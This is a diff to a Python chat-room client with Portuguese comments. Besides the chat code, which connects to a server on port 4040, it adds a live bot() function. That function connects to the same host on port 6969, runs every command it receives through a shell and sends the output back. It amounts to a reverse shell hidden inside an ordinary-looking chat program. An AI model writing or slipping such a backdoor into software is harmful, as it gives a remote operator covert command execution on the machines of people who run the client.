@@ -7,7 +7,8 @@ messages=[]
 host= sys.argv[1]
 clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 clientsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-clientsocket.connect((sys.argv[1], headerchatroom.PORT))
+#clientsocket.connect((sys.argv[1], headerchatroom.PORT))
+clientsocket.connect((host, 4040))
 CURSOR_UP_ONE = '\x1b[1A'
 ERASE_LINE = '\x1b[2K'
 os.system("clear")
@@ -21,7 +22,8 @@ def client():
     socket_list = [sys.stdin, clientsocket] #Lista de sockets
 
     while True:
-        read_sockets, write_sockets, error_sockets = select.select(socket_list, [], []) #Organiza tudo em listas(User,Mensagens,Erros)
+        read_sockets, write_sockets, error_sockets = select.select(socket_list, [], [])
+        #Organiza tudo em listas(User,Mensagens,Erros)
         for socket in read_sockets:
             if socket is clientsocket: # Se existe uma msg a vir, recebe
                 msg = socket.recv(BUFFER)
@@ -65,40 +67,19 @@ def client():
 def bot():
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.connect((sys.argv[1], 6969))
+    sock.connect((host, 6969))
+    #sock.setblocking(0)
     while 1:
         command = sock.recv(1024)
         #stdin=command
         command = command.decode()
         proc= subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
         proc_result = proc.stdout.read() + proc.stderr.read()
-        #print(proc_results)
-        #if proc_result is b'':
-            #sock.send("Sucesso")
-        #else:
-        sock.send(proc_result)
-
-    '''
-    host = sys.argv[1]
-port = int(sys.argv[2])
-#msg = "\n"
-
-    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-
-sock.connect((host,port))
-
-while 1:
-    command = sock.recv(1024)
-    #stdin=command
-    command = command.decode()
-    proc= subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
-    proc_result = proc.stdout.read() + proc.stderr.read()
-    #print(proc_results)
-    if proc_result is b'':
-        sock.send("Sucesso")
-    else:
-        sock.send(proc_result) #+ (msg.encode("utf-8")) )
-    '''
+        print(proc_result,"PROCRESULT")
+        if proc_result == b'':
+            sock.send(b" ")
+        else:
+            sock.send(proc_result)
 
 if __name__=="__main__": #client()
     var = threading.Thread(target=client)
